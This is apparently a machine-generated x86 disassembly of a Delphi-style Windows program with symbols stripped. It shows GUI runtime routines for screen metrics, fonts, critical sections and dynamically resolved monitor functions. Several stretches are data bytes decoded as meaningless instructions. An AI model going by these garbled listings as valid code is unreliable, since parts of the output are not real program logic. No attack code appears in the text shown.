call sub_4038b8
call sub_40390c
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_423958
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_423998
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] esi
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_421214
mov eax [ ebx + 0x28 ]
call sub_421218
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x28 ] eax
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_423a18
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4237ec
mov eax [ ebx + 0x28 ]
mov ebx [ eax + 0xc ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax esi
call sub_415c28
pop esi
pop ebx
retn
sub_423a68
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_423aa9
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call sub_41fb30
mov ecx esi
mov edx ebx
call sub_41f7d0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423ab0
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
sub_423ab8
push ebx
push 0x0
call GetDC
mov ebx eax
push 0x5a
push ebx
call GetDeviceCaps
mov [ rw-data ] eax
push ebx
push 0x0
call ReleaseDC
mov eax rw-data
mov edx 0xf
call sub_41e474
mov [ rw-data ] eax
pop ebx
retn
sub_423af0
push ebx
push esi
add esp 0xffffffc8
mov bl 0x1
push 0x0
call GetDC
mov esi eax
test esi esi
je r-xdata
mov eax ebx
add esp 0x38
pop esi
pop ebx
retn
mov eax [ rw-data ]
push eax
push esi
call SelectObject
test eax eax
je r-xdata
push esi
push 0x0
call ReleaseDC
push esp
push esi
call GetTextMetricsA
test eax eax
je r-xdata
mov bl [ esp + 0x34 ]
sub_423b34
push ebx
push esi
push edi
push 0x48
mov eax [ rw-data ]
push eax
push 0x8
call MulDiv
neg eax
mov [ rw-data ] eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_423af0
mov ebx eax
mov eax ebx
sub al 0x80
jne r-xdata
mov esi r-xdata
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x48
mov eax [ rw-data ]
push eax
push 0x9
call MulDiv
neg eax
mov [ rw-data ] eax
mov [ rw-data ] bl
sub_423c00
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax esi
pop esi
pop ebx
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_423c38
push ebx
push esi
call sub_403490
mov ebx edx
mov esi eax
mov eax esi
call sub_423e30
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403478
sub_423c7c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_423c64
xor eax eax
push ebp
push sub_423d1d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423d24
mov eax [ ebp - 0x4 ]
call sub_423c70
retn
mov eax 0x10
call sub_4026bc
mov [ ebp - 0x8 ] eax
mov edi [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ edi ] eax
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_423d30
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] esi
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp esi [ eax + 0xc ]
jne r-xdata
sub_423d30
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov dl 0x1
mov eax [ r-xdata ]
call sub_421cbc
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push j_sub_4035a4#3
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x8 ]
call sub_422284
mov edi eax
mov eax [ edi + 0x14 ]
xor edx edx
call sub_41d510
mov eax [ edi + 0x14 ]
mov edx ebx
call sub_41d3f4
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_412938
lea edx [ ebp - 0x18 ]
mov eax edi
call sub_41d798
xor esi esi
mov edx ebx
and edx 0x80000001
jns r-xdata
dec eax
or eax 0xfffffffe
inc eax
cmp eax edx
jne r-xdata
dec edx
or edx 0xfffffffe
inc edx
inc ebx
cmp ebx 0x9
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov ecx esi
mov edx ebx
mov eax edi
call sub_41daf4
mov eax esi
and eax 0x80000001
jns r-xdata
inc esi
cmp esi 0x9
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x8 ]
call sub_421f40
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_423e30
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_423c64
xor eax eax
push ebp
push sub_423e7b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423e82
mov eax [ ebp - 0x4 ]
call sub_423c70
retn
mov esp ebp
pop ebp
retn
sub_423e82
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_4026dc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
call sub_403104
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_423c64
xor eax eax
push ebp
push sub_423e7b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423e82
mov eax [ ebp - 0x4 ]
call sub_423c70
retn
mov esp ebp
pop ebp
retn
sub_423ea8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
call sub_41c768
push eax
mov eax ebx
call sub_41c768
mov edx eax
mov eax [ rw-data ]
pop ecx
call sub_423c7c
mov eax [ eax + 0x4 ]
pop esi
pop ebx
retn
sub_423ee0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_423fa9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423fb0
retn
mov eax [ rw-data ]
call sub_403104
mov eax [ rw-data ]
call sub_403104
mov eax [ rw-data ]
call sub_403104
call sub_420ef8
mov eax [ rw-data ]
call sub_403104
mov eax [ rw-data ]
call sub_403104
mov eax [ rw-data ]
call sub_403104
mov eax [ rw-data ]
call sub_403104
mov eax [ rw-data ]
call sub_403104
mov eax [ rw-data ]
push eax
call DeleteObject
push rw-data
call DeleteCriticalSection
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_4048dc
mov eax rw-data
mov ecx 0x34
mov edx [ r-xdata ]
call sub_4048dc
sub_423fb4
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_423ab8
push rw-data
call InitializeCriticalSection
push rw-data
call InitializeCriticalSection
push 0x7
call GetStockObject
mov [ rw-data ] eax
push 0x5
call GetStockObject
mov [ rw-data ] eax
push 0xd
call GetStockObject
mov [ rw-data ] eax
push 0x7f00
push 0x0
call LoadIconA
mov [ rw-data ] eax
call sub_423b34
mov cx 0x2c
mov dl 0x1
mov eax [ sub_41beac ]
call sub_41bf20
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ sub_41beac ]
call sub_41bf20
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ sub_41beac ]
call sub_41bf20
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_423c00
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_413f80
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_413f80
mov [ rw-data ] eax
mov ecx sub_41c778
mov edx sub_41c788
mov eax [ sub_41aeb8 ]
call sub_413734
mov ecx r-xdata
mov edx sub_41c990
mov eax [ r-xdata ]
call sub_413734
sub_4240c0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4240e5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4240ec
retn
sub_4240fc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
inc ecx
inc edx
add [ eax + eax ] dl
add [ eax ] al
pop eax
sbb [ ecx ] eax
dec esp
xor eax [ eax ]
pop eax
xor eax [ eax ]
pop esp
xor eax [ eax ]
pushad
xor eax [ eax ]
push esp
xor eax [ eax ]
pushfd
xor [ eax ] al
mov eax 0xf0004030
cmp eax [ ecx ]
xchg esp eax
cmp eax 0x42800041
inc edx
add [ esp + edi + 0x41 ] al
add al al
cmp al 0x41
add [ ebx ] cl
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + ecx * 2 + 0x69 ] si
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ edx + 0x42 ] al
lodsb [ esi ]
inc ecx
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x8004241 ] bh
add [ eax ] al
add [ eax + 0x4c004010 ] ah
xor eax [ eax ]
pop eax
xor eax [ eax ]
pop esp
xor eax [ eax ]
pushad
xor eax [ eax ]
push esp
xor eax [ eax ]
pushfd
xor [ eax ] al
mov eax 0x8004030
inc ebx
inc edx
add [ eax + 0x29 ] al
inc eax
add [ ebx + eax * 2 + 0x42 ] cl
add [ eax ] bh
inc ebx
inc edx
add [ esp + edx * 2 ] cl
dec edi
jb r-xdata
cli
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
arpl [ ebx - 0x70 ] bp
push esp
push ebx
je r-xdata
jb r-xdata
mov ecx ebx
mov edx edi
mov eax esi
call sub_413f7c
pop edi
pop esi
pop ebx
retn
cmp bl 0x2
jne r-xdata
add [ eax ] cl
add [ eax ] al
add [ eax + 0x41 ] ah
inc edx
add [ ebx + esi + 0x40 ] cl
add [ eax + 0x33 ] bl
inc eax
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add [ eax ] cl
inc ebx
inc edx
add [ ebx + eax * 2 + 0x42 ] ch
add [ ebx + eax * 2 + 0x42 ] cl
add [ eax ] bh
inc ebx
inc edx
add [ esi ] al
dec esp
imul esi [ ebx + 0x74 ] 0x1400408d
inc edx
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
inc edx
inc edx
mov eax edi
call sub_403104
sub_424228
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4030d4
mov [ esi + 0x10 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax esi
pop esi
pop ebx
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_424280
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov ecx ebx
mov edx edi
mov eax esi
call sub_413f7c
pop edi
pop esi
pop ebx
retn
cmp bl 0x2
jne r-xdata
mov eax edi
call sub_403104
sub_4242c4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4030d4
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax esi
pop esi
pop ebx
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_424308
push ebx
push esi
call sub_403490
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403104
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030f4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403478
sub_42434c
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x8 ]
dec edx
call sub_413c5c
mov eax esi
pop esi
pop ebx
retn
sub_424378
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42439d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4243a4
retn
sub_424474
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_424499
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4244a0
retn
sub_4244ac
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404304
xor eax eax
push ebp
push sub_42456b
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
xor eax eax
mov al bl
cmp [ eax + rw-data ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424572
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
cmp [ rw-data ] 0x0
je r-xdata
xor esi esi
test bl bl
jne r-xdata
test bl bl
je r-xdata
mov esi edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_404314
push eax
mov eax [ rw-data ]
push eax
call GetProcAddress
mov esi eax
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov al bl
mov [ eax + rw-data ] 0x1
mov [ rw-data ] 0x1
test esi esi
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_4244ac
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_403e54
sub_424594
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
or eax 0xffffffff
mov edx ebx
add edx 0xffffffb4
sub edx 0x2
jb r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
xor eax eax
call sub_4244ac
mov [ rw-data ] eax
push ebx
call [ rw-data ]
jmp r-xdata
xor eax eax
jmp r-xdata
je r-xdata
pop ebx
pop ebp
retn 0x4
cmp eax 0xffffffff
jne r-xdata
xor ebx ebx
jmp r-xdata
dec edx
je r-xdata
push ebx
call GetSystemMetrics
mov ebx 0x1
dec edx
sub edx 0x2
jae r-xdata
mov eax 0x1
jmp r-xdata
sub_42461c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor esi esi
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x2
call sub_4244ac
mov [ rw-data ] eax
push edi
push ebx
call [ rw-data ]
mov esi eax
jmp r-xdata
mov esi 0x12340042
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp [ ebx + 0xc ] 0x0
jle r-xdata
push 0x0
call [ rw-data ]
cmp eax [ ebx ]
jle r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebx + 0x4 ]
jle r-xdata
sub_4246ac
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
mov eax ebx
and eax 0x3
test al al
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x1
call sub_4244ac
mov [ rw-data ] eax
push ebx
push esi
call [ rw-data ]
jmp r-xdata
push esi
call IsIconic
test eax eax
je r-xdata
mov eax 0x12340042
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetWindowPlacement
jmp r-xdata
push ebx
lea eax [ ebp - 0x10 ]
push eax
call sub_42461c
sub_424742
add [ eax ] al
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x3
call sub_4244ac
mov [ rw-data ] eax
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov ebx 0x12340042
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push 0x0
call [ rw-data ]
cmp esi eax
jge r-xdata
cmp [ ebp + 0xc ] 0x0
jl r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_4247c3
call [ eax ]
add [ eax ] al
add [ ebp + 0x6f ] cl
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x6d6f7246
push eax
outsd
imul ebp [ esi + 0x74 ] 0x0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_4244ac
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_4248b0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x5
call sub_4244ac
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_424984
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x6
call sub_4244ac
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_424a58
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x7
call sub_4244ac
mov [ rw-data ] eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push edi
push esi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
push 0x0
call [ rw-data ]
mov [ ebp - 0x14 ] eax
push 0x1
call [ rw-data ]
mov [ ebp - 0x10 ] eax
test esi esi
je r-xdata
test edi edi
je r-xdata
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetClipBox
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push esi
call GetDCOrgEx
test eax eax
je r-xdata
mov eax [ ebp + 0x14 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push esi
push 0x12340042
call [ ebp + 0x10 ]
mov ebx eax
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
neg eax
push eax
mov eax [ ebp - 0x8 ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov bl 0x1
jmp r-xdata
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x1
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_424bf3
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_424c19
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424c20
retn
sub_424c34
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_424c59
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424c60
retn
sub_424cd8
fmul [ edx + eax * 2 ]
movups [ ecx + 0x43 ] xmm1
adc eax 0x65705349
arpl [ ecx + 0x61 ] bp
insb
push edi
imul ebp [ esi + 0x48 ] 0x56706c65
je r-xdata
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
add [ edi ] cl
insd
dec eax
insb
jo r-xdata
insb
dec esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ecx * 2 ] dl
outsb
je r-xdata
lodsd [ esi ]
imul esp [ ebp + 0x77 ] 0x11147265
inc eax
add [ ecx ] al
xchg ebx eax
cld
outsb
je r-xdata
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
inc eax
add [ eax - 0xbffbfd0 ] bh
jns r-xdata
xor [ eax ] al
adc al 0x45
dec eax
insb
jo r-xdata
add [ eax + 0x4c00406d ] dh
xor eax [ eax ]
pop eax
xor eax [ eax ]
pop esp
xor eax [ eax ]
pushad
xor eax [ eax ]
push esp
xor eax [ eax ]
pushfd
xor [ eax ] al
mov eax 0xf4004030
jae r-xdata
dec ebp
outsb
je r-xdata
jns r-xdata
cmp cl [ ecx ]
dec eax
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
jae r-xdata
jo r-xdata
or [ eax + 0x65 ] ecx
insb
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
adc [ eax ] eax
add [ ebx + edx * 4 - 0x4 ] esp
xor [ edx ] ecx
add [ eax ] al
add eax 0xffffffd4
jmp r-xdata
imul esp [ ebp + 0x77 ] 0x6f4e7265
mov eax eax
push esi
je r-xdata
add [ edi ] cl
or al 0x49
dec eax
insb
jo r-xdata
add bh bh
dec [ ebx + 0x424d94c0 ]
inc edx
add [ eax + eax ] cl
add [ eax ] al
mov al 0x6d
inc eax
add [ ebx + esi + 0x40 ] cl
add [ eax + 0x33 ] bl
inc eax
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
dec esi
popad
outsb
popad
jb r-xdata
add al al
dec edi
jae r-xdata
insb
